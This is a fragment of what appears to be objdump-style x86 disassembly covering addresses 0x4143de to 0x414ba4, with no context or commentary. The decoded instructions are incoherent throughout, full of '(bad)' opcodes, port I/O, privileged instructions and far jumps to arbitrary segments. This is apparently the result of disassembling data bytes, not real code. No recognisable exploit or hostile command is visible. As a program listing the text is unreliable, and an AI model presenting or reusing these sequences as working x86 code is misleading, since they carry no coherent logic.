  4143de:	and    eax,DWORD PTR [eax-0x9]
  4143e1:	cmp    DWORD PTR [ebx],edi
  4143e3:	(bad)  
  4143e4:	icebp  
  4143e5:	lods   al,BYTE PTR ds:[esi]
  4143e6:	in     eax,0xd6
  4143e8:	dec    edi
  4143e9:	shl    DWORD PTR [edi-0x74c2a9a5],1
  4143ef:	mov    esp,0x54a0e789
  4143f4:	lock dec edx
  4143f6:	std    
  4143f7:	out    dx,al
  4143f8:	inc    eax
  4143f9:	xor    edx,DWORD PTR [ecx+0x64c26bc9]
  4143ff:	xor    ebp,ecx
  414401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414402:	pop    ebx
  414403:	das    
  414404:	push   ecx
  414405:	jge    0x414406
  414407:	pop    esp
  414408:	push   esi
  414409:	jg     0x41447b
  41440b:	lea    esp,[ebx]
  41440d:	and    ebx,DWORD PTR [ebx]
  41440f:	out    dx,al
  414410:	daa    
  414411:	sbb    al,0x1f
  414413:	jne    0x4143fe
  414415:	shr    DWORD PTR [eax-0x24],0x34
  414419:	xor    DWORD PTR [esp+esi*2-0x663855f2],0xb6fa011a
  414424:	jg     0x4143c4
  414426:	jb     0x41449e
  414428:	(bad)  
  414429:	or     DWORD PTR [ebx],0xfffffff2
  41442c:	cmp    al,BYTE PTR [edi-0x28]
  41442f:	cmp    eax,0x3639bd56
  414434:	adc    BYTE PTR [edi+0x42],0xc1
  414438:	neg    ebp
  41443a:	pop    ebp
  41443b:	dec    eax
  41443c:	sar    DWORD PTR [ebx],cl
  41443e:	aas    
  41443f:	jle    0x41443c
  414441:	mov    ds:0x94fc9a64,al
  414446:	pop    edx
  414447:	pushf  
  414448:	push   ecx
  414449:	mov    esp,0xbf8538f6
  41444e:	shr    BYTE PTR [edi+0x4f99c09f],1
  414454:	in     al,dx
  414455:	mov    bh,0x52
  414457:	in     eax,0x55
  414459:	ja     0x414453
  41445b:	outs   dx,BYTE PTR ds:[esi]
  41445c:	je     0x41444e
  41445e:	ins    DWORD PTR es:[edi],dx
  41445f:	stos   BYTE PTR es:[edi],al
  414460:	mov    ch,0xbf
  414462:	test   al,0x9d
  414464:	jg     0x414404
  414466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414467:	xor    DWORD PTR [edx+edx*8],esi
  41446a:	dec    esi
  41446b:	mov    ds:0xda5cd4c1,al
  414470:	imul   ecx,eax,0xb5b10d3a
  414476:	cmp    dl,ah
  414478:	test   DWORD PTR [ebx-0x2e],edi
  41447b:	dec    eax
  41447c:	loopne 0x41442b
  41447e:	sti    
  41447f:	out    dx,al
  414480:	mov    eax,ds:0xf5425c72
  414485:	shl    BYTE PTR [eax+ebx*1],0x84
  414489:	hlt    
  41448a:	mov    WORD PTR [esi],cs
  41448c:	sub    DWORD PTR gs:[eax+edx*4],0xffffffb7
  414491:	lahf   
  414492:	jp     0x4144f0
  414494:	jl     0x4144b5
  414496:	retf   
  414497:	daa    
  414498:	int    0x3d
  41449a:	sbb    esp,ecx
  41449c:	ins    DWORD PTR es:[edi],dx
  41449d:	ss ja  0x4144cf
  4144a0:	add    ch,dl
  4144a2:	pushf  
  4144a3:	and    cl,BYTE PTR [esi]
  4144a5:	mov    dl,0x7d
  4144a7:	test   al,0x2
  4144a9:	int    0x2a
  4144ab:	dec    dx
  4144ad:	xchg   BYTE PTR [eax-0x60c05e0b],bh
  4144b3:	clc    
  4144b4:	sub    eax,ebx
  4144b6:	scas   eax,DWORD PTR es:[edi]
  4144b7:	mov    ch,0x99
  4144b9:	add    ebx,0xfd52a28d
  4144bf:	and    DWORD PTR [edx],esp
  4144c1:	fisubr WORD PTR [edx]
  4144c3:	mov    edi,0x7c5f55a2
  4144c8:	mov    ah,0x5f
  4144ca:	sub    al,0x50
  4144cc:	xchg   edx,eax
  4144cd:	sbb    ebp,DWORD PTR [esi]
  4144cf:	ret    
  4144d0:	jl     0x4144b5
  4144d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144d3:	out    dx,al
  4144d4:	bswap  ebp
  4144d6:	jae    0x4144ee
  4144d8:	adc    bl,BYTE PTR [esi-0x15b86374]
  4144de:	add    DWORD PTR [edx],0x2d548cd9
  4144e4:	mov    ah,0xb8
  4144e6:	out    0xbd,al
  4144e8:	or     al,0x53
  4144ea:	cwde   
  4144eb:	jbe    0x41452e
  4144ed:	add    dh,BYTE PTR [edi]
  4144ef:	mov    eax,ds:0x868cb056
  4144f4:	cwde   
  4144f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144f6:	cmp    eax,0xd2d729af
  4144fb:	pop    es
  4144fc:	add    DWORD PTR [edi+0x9ebae79],0xe6cc3047
  414506:	ficom  WORD PTR [edi-0x43]
  414509:	retf   
  41450a:	jb     0x4144b5
  41450c:	jns    0x41452b
  41450e:	xchg   BYTE PTR [eax],dl
  414510:	mov    eax,0x77e0256f
  414515:	jmp    0x3c76:0x61bda365
  41451c:	int3   
  41451d:	pop    ebp
  41451e:	icebp  
  41451f:	pop    eax
  414520:	(bad)  
  414521:	repz mov ds:0xf4daa421,al
  414527:	xchg   ecx,eax
  414528:	xor    al,bl
  41452a:	cli    
  41452b:	jns    0x4144b6
  41452d:	xor    al,0xbd
  41452f:	push   0xacf37d5c
  414534:	fild   DWORD PTR [esi-0x3]
  414537:	sub    esp,DWORD PTR [edi]
  414539:	stos   BYTE PTR es:[edi],al
  41453a:	cdq    
  41453b:	dec    ebp
  41453c:	and    DWORD PTR [eax-0x79],edi
  41453f:	sahf   
  414540:	pop    esp
  414541:	stos   BYTE PTR es:[edi],al
  414542:	sbb    bh,BYTE PTR [edi+0x467e8ac4]
  414548:	jge    0x414515
  41454a:	cmp    DWORD PTR [ebx+0x596fadf8],esi
  414550:	test   eax,0x8af063a5
  414555:	(bad)  
  414556:	loope  0x4144f4
  414558:	mov    edx,0xd8257c12
  41455d:	cmp    BYTE PTR [edx+0x29],ch
  414560:	dec    edi
  414561:	stos   BYTE PTR es:[edi],al
  414562:	mov    ah,0xa9
  414564:	stos   BYTE PTR es:[edi],al
  414565:	add    dh,bl
  414567:	or     al,BYTE PTR [ecx-0x6ede96bc]
  41456d:	cmp    ecx,ebx
  41456f:	xor    al,0x80
  414571:	pop    esi
  414572:	pop    ds
  414573:	adc    al,0x6f
  414575:	mov    dh,0xf8
  414577:	inc    esi
  414578:	shl    DWORD PTR ss:[ebp-0x3f8706f],1
  41457f:	jp     0x41456d
  414581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414582:	xchg   BYTE PTR [ecx-0x6714f4b],cl
  414588:	int3   
  414589:	(bad)  
  41458a:	idiv   DWORD PTR ds:0x2b87c94b
  414590:	iret   
  414591:	dec    ecx
  414592:	pop    edx
  414593:	add    eax,esi
  414595:	jge    0x4145d3
  414597:	lock sub edx,DWORD PTR cs:[edx+0xbeefd77]
  41459f:	jb     0x414568
  4145a1:	adc    al,0x81
  4145a3:	(bad)  
  4145a4:	mov    eax,0x5799aaab
  4145a9:	pop    ecx
  4145aa:	fs dec esp
  4145ac:	lods   al,BYTE PTR ds:[esi]
  4145ad:	aaa    
  4145ae:	jne    0x4145fb
  4145b0:	xchg   DWORD PTR [ebx],edi
  4145b2:	shl    al,1
  4145b4:	inc    ebp
  4145b5:	xor    ebx,DWORD PTR [esi-0x17074637]
  4145bb:	mov    esp,0xd633e86a
  4145c0:	stos   BYTE PTR es:[edi],al
  4145c1:	in     eax,dx
  4145c2:	add    BYTE PTR ds:0xd6780938,al
  4145c8:	jne    0x4145c7
  4145ca:	adc    ecx,DWORD PTR [esi]
  4145cc:	sbb    al,bl
  4145ce:	and    eax,0xd1680fa4
  4145d3:	aad    0x4c
  4145d5:	and    DWORD PTR [ecx-0x27bbe29d],0x3d
  4145dc:	mov    esp,0xd516e974
  4145e1:	sub    BYTE PTR [ecx-0x4fe8597a],bl
  4145e7:	stos   BYTE PTR es:[edi],al
  4145e8:	jbe    0x414650
  4145ea:	out    0x87,al
  4145ec:	push   eax
  4145ed:	ds and al,0xea
  4145f0:	inc    ebx
  4145f1:	jle    0x414613
  4145f3:	ss cli 
  4145f5:	add    eax,0xb926b278
  4145fa:	xor    eax,DWORD PTR [edx+0x42ef1d6d]
  414600:	inc    esi
  414601:	fsub   st,st(0)
  414603:	mov    bl,BYTE PTR [edi+0x63]
  414606:	int3   
  414607:	shl    BYTE PTR [edx-0x21b22894],1
  41460d:	mov    ss,WORD PTR [ebp-0x5b853c7b]
  414613:	xor    DWORD PTR [eax-0x4c],eax
  414616:	jle    0x414683
  414618:	pop    esp
  414619:	jle    0x414634
  41461b:	xor    edx,esi
  41461d:	xor    al,0x59
  41461f:	or     al,0x5e
  414621:	ret    0xa78b
  414624:	and    al,BYTE PTR [edi+0x1d]
  414627:	rcr    eax,0xe1
  41462a:	das    
  41462b:	jecxz  0x4145bb
  41462d:	xor    ah,bl
  41462f:	mov    gs,WORD PTR [edi]
  414631:	inc    ecx
  414632:	inc    ebp
  414633:	popf   
  414634:	jle    0x41460c
  414636:	call   0xfb74:0x27f01a5
  41463d:	je     0x414616
  41463f:	add    bl,BYTE PTR [edi+0x5a]
  414642:	add    eax,0x822b32dc
  414647:	and    eax,0xef439455
  41464c:	ja     0x414646
  41464e:	popa   
  41464f:	add    ebp,edi
  414651:	push   0xf37a87a9
  414656:	cmovge ebx,ecx
  414659:	(bad)  
  41465a:	daa    
  41465b:	mov    al,ds:0x27a4aa00
  414660:	mov    ah,0x14
  414662:	ficom  DWORD PTR [edx]
  414664:	mov    ebx,0xb8635f61
  414669:	push   edx
  41466a:	add    al,0x18
  41466c:	xchg   ebx,eax
  41466d:	push   ebx
  41466e:	fdiv   DWORD PTR [ebx]
  414670:	iret   
  414671:	icebp  
  414672:	jns    0x4146b6
  414674:	pop    esp
  414675:	iret   
  414676:	mov    edi,0xd232e96b
  41467b:	or     DWORD PTR [esi-0x29],ebp
  41467e:	mov    ch,0xb6
  414680:	or     al,0xdc
  414682:	aaa    
  414683:	adc    eax,0x91064a9a
  414688:	out    0x8e,eax
  41468a:	push   eax
  41468b:	jl     0x41467b
  41468d:	pop    esp
  41468e:	inc    ecx
  41468f:	clc    
  414690:	and    ebp,DWORD PTR [esi]
  414692:	aas    
  414693:	and    esp,DWORD PTR [ecx+0x78]
  414696:	or     eax,0x16444181
  41469b:	push   ebx
  41469c:	bswap  esi
  41469e:	syscall 
  4146a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a1:	js     0x41464e
  4146a3:	cmp    ebp,DWORD PTR [ecx+edx*2-0x71]
  4146a7:	xchg   DWORD PTR [edx-0x19],ebx
  4146aa:	ss mov ebx,0x988deab4
  4146b0:	loopne 0x41471a
  4146b2:	add    ah,dh
  4146b4:	jb     0x414674
  4146b6:	(bad)  
  4146b8:	das    
  4146b9:	bound  edx,QWORD PTR [esi]
  4146bb:	xchg   ecx,eax
  4146bc:	dec    ebx
  4146bd:	mov    ecx,0xf9d9f1c9
  4146c2:	xchg   esi,eax
  4146c4:	lock pop ds
  4146c6:	pusha  
  4146c7:	sbb    DWORD PTR [edx-0x24b1172f],esi
  4146cd:	es add al,0xcc
  4146d0:	sbb    ah,BYTE PTR [esi]
  4146d2:	jae    0x414691
  4146d4:	fld    QWORD PTR [edi+esi*4-0xa194ad3]
  4146db:	pmulhrw mm4,mm2
  4146df:	mov    edx,0x68a62bb0
  4146e4:	jl     0x41469a
  4146e6:	idiv   DWORD PTR [eax-0x241be76f]
  4146ec:	dec    esi
  4146ed:	or     bl,BYTE PTR [edx-0x78]
  4146f0:	(bad)  
  4146f1:	adc    eax,0x83f4577d
  4146f6:	pop    eax
  4146f7:	mov    esi,0x5b3c3d7
  4146fc:	(bad)  
  4146fd:	rcl    DWORD PTR [ebx+ecx*4],cl
  414700:	shl    DWORD PTR fs:[ecx+0x45],0x89
  414705:	jbe    0x414749
  414707:	adc    ebx,edi
  414709:	lods   al,BYTE PTR ds:[esi]
  41470a:	xchg   esp,eax
  41470b:	cli    
  41470c:	sub    al,0x42
  41470e:	in     al,0xcd
  414710:	mov    ch,0x18
  414712:	mov    esp,0x32f024f0
  414717:	shl    DWORD PTR [esi],0x1f
  41471a:	mov    ebx,0xf6e5b17
  41471f:	scas   eax,DWORD PTR es:[edi]
  414720:	cli    
  414721:	dec    eax
  414722:	punpcklbw mm3,mm3
  414725:	repz pop es
  414727:	cmc    
  414728:	iret   
  414729:	inc    ebx
  41472a:	paddd  mm0,QWORD PTR [ecx+0xc3f3b7e]
  414731:	and    dl,BYTE PTR [ecx+0x6b8da44]
  414737:	or     ecx,edi
  414739:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  41473d:	or     BYTE PTR [eax],cl
  41473f:	shl    edx,0x1e
  414742:	mov    edx,DWORD PTR [esi]
  414744:	mov    ecx,DWORD PTR [esi+0x4]
  414747:	jmp    0x414cd1
  41474c:	arpl   WORD PTR [edx-0x67eb5a1b],bx
  414752:	and    esp,DWORD PTR [eax]
  414754:	stos   DWORD PTR es:[edi],eax
  414755:	sub    eax,eax
  414757:	scas   al,BYTE PTR es:[edi]
  414758:	xchg   ebx,eax
  414759:	push   0xdd6fa803
  41475e:	or     al,0x16
  414760:	cmp    eax,0x49161604
  414765:	mov    dl,BYTE PTR [edx*1+0x52b885e5]
  41476c:	iret   
  41476d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41476e:	sbb    eax,DWORD PTR [esi]
  414770:	xor    cl,dl
  414772:	cmp    eax,DWORD PTR [esi+0x18bb26f1]
  414778:	(bad)  
  414779:	push   ebp
  41477a:	(bad)  
  41477b:	enter  0x3860,0x2
  41477f:	sbb    BYTE PTR cs:[ecx+0xc],ah
  414783:	mov    dl,bl
  414785:	mov    bh,dh
  414787:	js     0x414720
  414789:	test   DWORD PTR [eax+0x3cc57646],ecx
  41478f:	xchg   ebx,eax
  414790:	mov    ds:0x1960e00f,eax
  414795:	imul   ebp,DWORD PTR [edi],0xffffffed
  414798:	mov    bh,BYTE PTR [ecx]
  41479a:	jnp    0x4147c2
  41479c:	jne    0x4147b0
  41479e:	dec    edi
  41479f:	mov    WORD PTR [ebx-0x6fd0dd0c],es
  4147a5:	lods   eax,DWORD PTR ds:[esi]
  4147a6:	into   
  4147a7:	retf   0xad30
  4147aa:	pop    ebp
  4147ac:	retf   0x8050
  4147af:	inc    esp
  4147b0:	inc    ebx
  4147b1:	mov    DWORD PTR [esi],0x8b79c6bc
  4147b7:	imul   edi,DWORD PTR [ebx-0x40],0x9
  4147bb:	mov    esp,0x3f65a4c0
  4147c0:	mov    eax,0xe6fd0129
  4147c5:	jp     0x414812
  4147c7:	stos   DWORD PTR es:[edi],eax
  4147c8:	loope  0x414761
  4147ca:	pop    es
  4147cb:	inc    edx
  4147cc:	fsubr  QWORD PTR ds:0x453db4e
  4147d2:	es pop ebp
  4147d4:	les    ecx,FWORD PTR [esi+0x3d]
  4147d7:	pop    edi
  4147d8:	mov    eax,ds:0xc7187082
  4147dd:	mov    al,ds:0xf6b6171c
  4147e2:	cmp    eax,0xd2f03c97
  4147e7:	addr16 and al,0x36
  4147ea:	add    BYTE PTR [ebx+ebp*2+0x4],dl
  4147ee:	cmp    DWORD PTR [ebp-0x64933be8],ebx
  4147f4:	bound  ecx,QWORD PTR [ecx]
  4147f6:	pop    edi
  4147f7:	sbb    edx,edx
  4147f9:	imul   ecx,esi,0x19f572b6
  4147ff:	xchg   ebx,eax
  414800:	test   eax,0xa478355
  414805:	out    0x8f,eax
  414807:	out    0xf9,eax
  414809:	xchg   ebp,eax
  41480a:	mov    ebp,0xdcb7db0d
  41480f:	sahf   
  414810:	out    0xc6,eax
  414812:	push   ebp
  414813:	loop   0x41482c
  414815:	outs   dx,BYTE PTR ds:[esi]
  414816:	push   esp
  414817:	add    BYTE PTR [ebp+0x489e699a],bl
  41481d:	aaa    
  41481e:	sbb    esi,DWORD PTR [ebp+0x1dd280ab]
  414824:	popa   
  414825:	ja     0x4147dd
  414827:	test   BYTE PTR [eax],bh
  414829:	bound  edx,QWORD PTR [edx+0x46]
  41482c:	adc    bh,BYTE PTR [ecx-0x5f]
  41482f:	or     ah,0x27
  414832:	push   es
  414833:	xchg   ebx,eax
  414834:	jne    0x414824
  414836:	push   ss
  414837:	call   0xc9b02cac
  41483c:	dec    eax
  41483d:	xchg   al,ah
  41483f:	iret   
  414840:	(bad)  
  414841:	js     0x414896
  414843:	push   0xac502dd
  414848:	repz mov al,ds:0xf66b9208
  41484e:	push   ecx
  41484f:	mov    esi,0x9056621b
  414854:	loop   0x41487f
  414856:	push   ss
  414857:	int    0x39
  414859:	je     0x414886
  41485b:	jb     0x4148c7
  41485d:	rol    DWORD PTR [ebp-0x6],cl
  414860:	and    al,0x3f
  414862:	or     al,0x36
  414864:	stos   BYTE PTR es:[edi],al
  414865:	loopne 0x4148a4
  414867:	clc    
  414868:	lods   al,BYTE PTR ds:[esi]
  414869:	aaa    
  41486a:	jl     0x414820
  41486c:	pop    ecx
  41486d:	adc    DWORD PTR [edx-0x47],ebx
  414870:	sub    DWORD PTR [eax],ecx
  414872:	mov    esi,ebp
  414874:	loopne 0x4148b4
  414876:	rcl    BYTE PTR [eax],0x4b
  414879:	hlt    
  41487a:	xor    ah,bh
  41487c:	mov    ebp,0x5917451c
  414881:	pop    edi
  414882:	jmp    0x4148e8
  414884:	gs dec ecx
  414886:	(bad)  
  414887:	aam    0x2f
  414889:	adc    al,0x6d
  41488b:	dec    ebp
  41488c:	inc    edx
  41488d:	pushf  
  41488e:	pusha  
  41488f:	(bad)  
  414890:	into   
  414891:	pop    edi
  414892:	jb     0x4148f5
  414894:	cmp    eax,0x25633a93
  414899:	xchg   ebx,eax
  41489a:	push   edi
  41489b:	shl    ecx,0xe7
  41489e:	call   0xbddb:0x5234a249
  4148a5:	lods   eax,DWORD PTR ds:[esi]
  4148a6:	fucomp st(4)
  4148a8:	push   esp
  4148a9:	pop    ebp
  4148aa:	pop    ds
  4148ab:	sbb    BYTE PTR [esi],dl
  4148ad:	cmc    
  4148ae:	push   ebp
  4148af:	push   ebx
  4148b0:	xchg   edx,eax
  4148b1:	aam    0xe4
  4148b3:	rol    DWORD PTR [ebx+0x124e1b82],0x4a
  4148ba:	xchg   ebx,eax
  4148bb:	xor    eax,0x981ba7
  4148c0:	in     eax,dx
  4148c1:	dec    esp
  4148c2:	rcr    DWORD PTR [ecx],cl
  4148c4:	aaa    
  4148c5:	sbb    eax,0x7b787e43
  4148ca:	outs   dx,DWORD PTR ds:[esi]
  4148cb:	out    dx,eax
  4148cc:	fild   QWORD PTR [esi-0x4ceb744d]
  4148d2:	in     eax,dx
  4148d3:	xor    al,0x34
  4148d5:	bound  ebx,QWORD PTR [esi+eax*8+0x3a]
  4148d9:	inc    eax
  4148da:	fiadd  WORD PTR [eax-0x7cb890dc]
  4148e0:	(bad)  
  4148e1:	hlt    
  4148e2:	add    DWORD PTR [ebx-0x6a],ecx
  4148e5:	leave  
  4148e6:	into   
  4148e7:	out    dx,al
  4148e8:	or     eax,0x832686ef
  4148ed:	(bad)  
  4148ee:	xor    eax,0x80d4d976
  4148f3:	int3   
  4148f4:	xlat   BYTE PTR ds:[ebx]
  4148f5:	fs sub ch,bh
  4148f8:	mov    esi,0xfcbbfde6
  4148fd:	xchg   BYTE PTR [ebp+0x33f177a5],bl
  414903:	xor    al,BYTE PTR [ecx-0x19]
  414906:	xor    eax,0x8f356fa6
  41490b:	scas   al,BYTE PTR es:[edi]
  41490c:	mov    bl,0xe9
  41490e:	inc    eax
  41490f:	fld    DWORD PTR [eax-0x47028e7b]
  414915:	les    ecx,FWORD PTR [esi-0x51]
  414918:	(bad)  
  41491a:	cmp    bh,0x20
  41491d:	mov    ch,0xc3
  41491f:	sub    bl,cl
  414921:	pop    ebx
  414922:	xchg   DWORD PTR [eax],eax
  414924:	xchg   esi,eax
  414925:	mov    ebx,0x972d0d73
  41492a:	mov    dh,0xd2
  41492c:	push   ebx
  41492d:	jo     0x414976
  41492f:	pop    edi
  414930:	dec    esi
  414931:	add    ecx,edi
  414933:	or     al,0x8b
  414935:	sbb    DWORD PTR [edi+0x65],0xfa10f600
  41493c:	out    dx,eax
  41493d:	popf   
  41493e:	jge    0x41495b
  414940:	sub    sp,WORD PTR [ebp+0x5a2c5604]
  414947:	pop    ecx
  414948:	push   ds
  414949:	inc    eax
  41494a:	sar    ebp,0xb1
  41494d:	pop    esp
  41494e:	loop   0x414998
  414950:	mov    esi,DWORD PTR [edx-0x40]
  414953:	and    eax,0x3f48d9f4
  414958:	sub    bl,BYTE PTR [ebx+0x18]
  41495b:	shl    DWORD PTR [esi+0x37c5ec0c],cl
  414961:	hlt    
  414962:	dec    ebp
  414963:	in     al,0xdc
  414965:	add    al,0x9f
  414967:	test   cl,dl
  414969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41496a:	dec    ebx
  41496b:	xor    BYTE PTR [esi],dl
  41496d:	jns    0x414921
  41496f:	shl    BYTE PTR [edi],1
  414971:	add    bh,BYTE PTR [ebp-0x78eec480]
  414977:	pop    es
  414978:	mov    ebp,0xc3ec705b
  41497d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41497e:	dec    ebx
  41497f:	add    al,0xef
  414981:	ror    BYTE PTR [esi],1
  414983:	fiadd  DWORD PTR [ebx+0x33709db]
  414989:	sbb    BYTE PTR [eax+0x6c],dh
  41498c:	inc    esp
  41498d:	sub    DWORD PTR [ebx+0x271139e],0xfffffff9
  414994:	cmpxchg ebp,edi
  414997:	fisubr WORD PTR [edi-0x2845be2]
  41499d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41499e:	pop    esi
  41499f:	int    0xcc
  4149a1:	cld    
  4149a2:	add    edx,DWORD PTR [ecx-0x6]
  4149a5:	(bad)  
  4149a6:	pop    esp
  4149a7:	dec    DWORD PTR [ecx+0x26]
  4149aa:	mov    ch,0xa4
  4149ac:	inc    ebp
  4149ad:	test   ebx,esi
  4149af:	inc    esp
  4149b0:	stos   BYTE PTR es:[edi],al
  4149b1:	adc    ah,dh
  4149b3:	rcl    BYTE PTR [esi-0x440ce429],cl
  4149b9:	inc    ebp
  4149ba:	cmp    ch,ch
  4149bc:	test   eax,0x6c61344f
  4149c1:	outs   dx,BYTE PTR ds:[esi]
  4149c2:	sbb    bl,BYTE PTR [ecx-0x24fbec43]
  4149c8:	dec    ecx
  4149c9:	je     0x414a12
  4149cb:	cmp    al,0x42
  4149cd:	scas   eax,DWORD PTR es:[edi]
  4149ce:	adc    al,0xde
  4149d0:	mov    cl,0x6b
  4149d2:	push   ss
  4149d3:	fwait
  4149d4:	outs   dx,DWORD PTR ds:[esi]
  4149d5:	or     BYTE PTR [ebp-0x2c],bl
  4149d8:	imul   eax,DWORD PTR [esi],0x7e
  4149db:	sub    bh,BYTE PTR [bx+di]
  4149de:	fwait
  4149df:	or     ecx,DWORD PTR [edi+edx*1+0x58d763d7]
  4149e6:	(bad)  
  4149e7:	cmp    DWORD PTR ds:[ecx+0x524d12ee],esi
  4149ee:	sub    al,0x1
  4149f0:	mov    edx,DWORD PTR [ecx]
  4149f2:	or     BYTE PTR [ecx],0xe5
  4149f5:	(bad)  
  4149f6:	ds sti 
  4149f8:	push   ebx
  4149f9:	repnz push es
  4149fb:	cli    
  4149fc:	daa    
  4149fd:	sbb    DWORD PTR [edx-0x2fa58330],0xdebc2b67
  414a07:	mov    bl,0x7e
  414a09:	cdq    
  414a0a:	cmp    BYTE PTR [ebx],bl
  414a0c:	cmc    
  414a0d:	sub    cl,bl
  414a0f:	mov    dl,0xd
  414a11:	sub    ecx,ebp
  414a13:	adc    eax,0xc71d4dce
  414a18:	popf   
  414a19:	cmp    al,BYTE PTR [esi-0x7d34a58e]
  414a1f:	xchg   esi,eax
  414a20:	xchg   esi,eax
  414a21:	and    ecx,ecx
  414a23:	iret   
  414a24:	pusha  
  414a25:	add    al,0x18
  414a27:	call   0xfe04:0x7ed9a023
  414a2e:	jnp    0x4149b9
  414a30:	pop    eax
  414a31:	pushf  
  414a32:	fwait
  414a33:	push   esp
  414a34:	add    BYTE PTR [ebp-0x21],0xb6
  414a38:	sbb    edi,DWORD PTR [eax]
  414a3a:	pop    ecx
  414a3b:	cmp    eax,0x8bb2eb3c
  414a40:	and    al,0x49
  414a42:	lock pop ss
  414a44:	clc    
  414a45:	test   ch,ah
  414a47:	leave  
  414a48:	shl    dl,0xa
  414a4b:	ins    BYTE PTR es:[edi],dx
  414a4c:	ds (bad) 
  414a4e:	jns    0x414a0c
  414a50:	xor    al,0x9d
  414a52:	xchg   esp,eax
  414a53:	imul   eax,DWORD PTR [eax+0xb19cbbf],0x60482e0a
  414a5d:	pop    eax
  414a5e:	mov    edx,0x75a93437
  414a63:	xlat   BYTE PTR ds:[ebx]
  414a64:	jae    0x414a19
  414a66:	out    dx,al
  414a67:	adc    BYTE PTR [eax],0x16
  414a6a:	sub    edx,DWORD PTR [eax]
  414a6c:	push   esi
  414a6d:	ins    DWORD PTR es:[edi],dx
  414a6e:	test   BYTE PTR ds:0x62bd2dde,dl
  414a74:	mov    al,ds:0xc5479966
  414a79:	imul   eax,DWORD PTR [esi+0x5d4db54b],0xb0b6a09d
  414a83:	ds out 0xe,eax
  414a86:	cli    
  414a87:	call   0x3ddb6b87
  414a8c:	mov    ds:0x59ef471f,eax
  414a91:	ja     0x414a78
  414a93:	ror    dl,cl
  414a95:	addr16 sbb esp,ecx
  414a98:	sub    esp,DWORD PTR [esi]
  414a9a:	icebp  
  414a9b:	fs inc ebx
  414a9d:	jg     0x414a89
  414a9f:	xchg   esp,eax
  414aa0:	jmp    0x414a32
  414aa2:	adc    eax,0x691f3c59
  414aa7:	push   eax
  414aa8:	pop    ss
  414aa9:	jg     0x414acf
  414aab:	add    BYTE PTR [eax+0x47],bl
  414aae:	es cmp eax,0xd002921b
  414ab4:	sbb    DWORD PTR [bp+di-0x78b4],0xffffff86
  414aba:	jge    0x414b22
  414abc:	mov    esi,DWORD PTR [esi-0x6f]
  414abf:	dec    ecx
  414ac0:	jae    0x414ac4
  414ac2:	cmp    BYTE PTR [esi+0x8624a82],ah
  414ac8:	pop    es
  414ac9:	jle    0x414ada
  414acb:	fs hlt 
  414acd:	mov    cl,0x55
  414acf:	pop    ss
  414ad0:	cld    
  414ad1:	cmp    esp,DWORD PTR [edx+0x69938aab]
  414ad7:	mov    eax,0x2ed25e51
  414adc:	mov    bl,0xc3
  414ade:	cmp    BYTE PTR [edx],al
  414ae0:	push   cs
  414ae1:	inc    ecx
  414ae2:	in     al,0xc9
  414ae4:	lds    edi,FWORD PTR [ebp+0x26]
  414ae7:	xor    BYTE PTR [eax+0x6f],ah
  414aea:	push   0xffffffc6
  414aec:	ret    0xd754
  414aef:	ret    
  414af0:	sub    ah,BYTE PTR [ebx+0x45]
  414af3:	push   edx
  414af4:	sub    al,0xdd
  414af6:	mov    bh,0x83
  414af8:	inc    ebp
  414af9:	sbb    esi,ecx
  414afb:	cwde   
  414afc:	int    0xa7
  414afe:	(bad)  
  414aff:	sti    
  414b00:	repz repnz and DWORD PTR [eax],0x7a114b37
  414b08:	mov    ecx,0xb6b5309c
  414b0d:	and    BYTE PTR [esi],ah
  414b0f:	or     dl,ch
  414b11:	and    al,bl
  414b13:	add    edi,DWORD PTR [esi-0x18]
  414b16:	jecxz  0x414b2e
  414b18:	call   0x47b35573
  414b1d:	add    al,0x63
  414b1f:	mov    al,0xfb
  414b21:	add    al,BYTE PTR [edi-0x203f1fe3]
  414b27:	push   ds
  414b28:	in     al,dx
  414b29:	sbb    ah,ah
  414b2b:	outs   dx,BYTE PTR cs:[esi]
  414b2d:	add    eax,0xa24e3617
  414b32:	dec    ebx
  414b33:	inc    esp
  414b34:	hlt    
  414b35:	stos   BYTE PTR es:[edi],al
  414b36:	xchg   ebp,eax
  414b37:	dec    ebp
  414b38:	adc    al,0xb1
  414b3a:	add    eax,0x5bf500cb
  414b3f:	(bad)  
  414b41:	shl    cl,1
  414b43:	or     edx,DWORD PTR [ecx]
  414b45:	ds pop eax
  414b47:	cmp    al,0x8
  414b49:	sbb    BYTE PTR [eax+0x76b4a367],ah
  414b4f:	icebp  
  414b50:	mov    bl,0x27
  414b52:	inc    esp
  414b53:	ret    
  414b54:	nop
  414b55:	inc    edx
  414b56:	sahf   
  414b57:	in     eax,dx
  414b58:	mov    cl,0x26
  414b5a:	mov    eax,ds:0xd0c9a17
  414b5f:	mov    ds:0x5e1c49a0,eax
  414b64:	dec    ebp
  414b65:	inc    esp
  414b66:	nop
  414b67:	lds    esi,FWORD PTR [ebx+0x5b67492d]
  414b6d:	fisttp QWORD PTR [eax]
  414b6f:	out    dx,al
  414b70:	out    dx,eax
  414b71:	adc    BYTE PTR [edi+0x248f6f27],cl
  414b77:	lods   al,BYTE PTR ds:[esi]
  414b78:	ins    BYTE PTR es:[edi],dx
  414b79:	repnz std 
  414b7b:	xchg   esi,eax
  414b7c:	fild   QWORD PTR [eax+0x3dcb757a]
  414b82:	add    eax,0xa4377962
  414b87:	fist   DWORD PTR [edi]
  414b89:	inc    esp
  414b8a:	cwde   
  414b8b:	data16 jb 0x414c02
  414b8e:	cli    
  414b8f:	sub    al,0x21
  414b91:	add    BYTE PTR [edi+edx*8+0x7],dh
  414b95:	xchg   edi,eax
  414b96:	pop    edx
  414b97:	xchg   esi,eax
  414b98:	and    al,0x9b
  414b9a:	inc    ebp
  414b9b:	adc    ebp,ebp
  414b9d:	aas    
  414b9e:	test   BYTE PTR [edx],dh
  414ba0:	adc    al,0x21
  414ba2:	clc    
  414ba3:	(bad)  
  414ba4:	mov    ebx,0xb8cb36
